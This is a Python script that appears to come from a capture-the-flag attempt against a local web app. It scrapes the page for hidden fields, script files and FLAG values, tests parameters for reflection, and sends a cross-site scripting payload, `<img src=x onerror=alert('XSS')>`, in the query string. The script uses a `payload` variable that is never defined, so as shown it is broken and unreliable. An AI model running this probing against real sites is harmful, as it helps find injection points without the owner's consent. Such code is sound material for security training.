import requests
import re
import urllib.parse

# First, let's look at the base page without parameters
url = "http://127.0.0.1:33203/page"

print(f"[+] Fetching base page: {url}")
response = requests.get(url)

print(f"[+] Status: {response.status_code}")
print(f"[+] Response Body:\n{'='*80}")
print(response.text)
print(f"\n{'='*80}")

# Check for JavaScript includes
print(f"\n[+] JavaScript Files Analysis:")
js_matches = re.findall(r'<script[^>]*src=["\']([^"\']+)["\'][^>]*>', response.text)
for js_file in js_matches:
    full_js_url = f"http://127.0.0.1:33203{js_file}" if not js_file.startswith('http') else js_file
    print(f"[+] Found JS file: {full_js_url}")
    
    # Try to fetch and analyze the JS file
    js_response = requests.get(full_js_url)
    if js_response.status_code == 200:
        print(f"  [+] JS content snippet: {js_response.text[:200]}...")
        
        # Look for form submission handlers
        if 'submit' in js_response.text.lower() or 'form' in js_response.text.lower():
            print(f"  [+] Form handling detected in JS")

# Check for hidden input fields
print(f"\n[+] Hidden Fields Analysis:")
hidden_matches = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', response.text)
for i, hidden in enumerate(hidden_matches, 1):
    print(f"[!] Hidden input #{i}: {hidden}")
    
    # Extract name and value
    name_match = re.search(r'name=["\']?([^\s>\"\']+)', hidden)
    value_match = re.search(r'value=["\']?([^\s>\"\']+)', hidden)
    
    if name_match:
        print(f"    Name: {name_match.group(1)}")
    if value_match:
        print(f"    Value: {value_match.group(1)}")
        if 'FLAG{' in value_match.group(1):
            print(f"    [!] FLAG FOUND in hidden field!")

# Check for form attributes
form_match = re.search(r'<form([^>]*)>', response.text)
if form_match:
    print(f"\n[+] Form Attributes: {form_match.group(1)}")
    
    # Check if form has action and method
    action_match = re.search(r'action=["\']?([^\s>\"\']+)', form_match.group(1))
    method_match = re.search(r'method=["\']?([^\s>\"\']+)', form_match.group(1))
    
    print(f"    Action: {action_match.group(1) if action_match else 'None (defaults to current page)'}")
    print(f"    Method: {method_match.group(1) if method_match else 'None (defaults to GET)'}")

# Try different parameter variations
print(f"\n[+] Testing Different Parameters:")
params_to_test = ['name', 'user', 'username', 'q', 'search', 'query', 'input', 'data']

for param in params_to_test:
    test_url = f"{url}?{param}=test_value_123"
    test_response = requests.get(test_url)
    
    if 'test_value_123' in test_response.text:
        print(f"[!] Reflection detected with parameter: {param}")
        print(f"    URL: {test_url}")
        
        # Now try XSS payload with this parameter
        xss_test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        xss_response = requests.get(xss_test_url)
        
        if payload in xss_response.text:
            print(f"[!!] XSS PAYLOAD REFLECTED with parameter: {param}")
        elif 'test_value_123' in xss_response.text:
            print(f"[!] Parameter {param} works, but payload may be filtered")
        break
else:
    print(f"[-] No reflection detected with common parameter names")

# One final test - try the parameter exactly as 'name' with no encoding
print(f"\n[+] Final Test - Unencoded payload:")
raw_url = f"{url}?name=<img src=x onerror=alert('XSS')>"
raw_response = requests.get(raw_url)

if payload in raw_response.text:
    print(f"[!] Unencoded payload reflected!")
else:
    print(f"[-] No reflection even with unencoded payload")
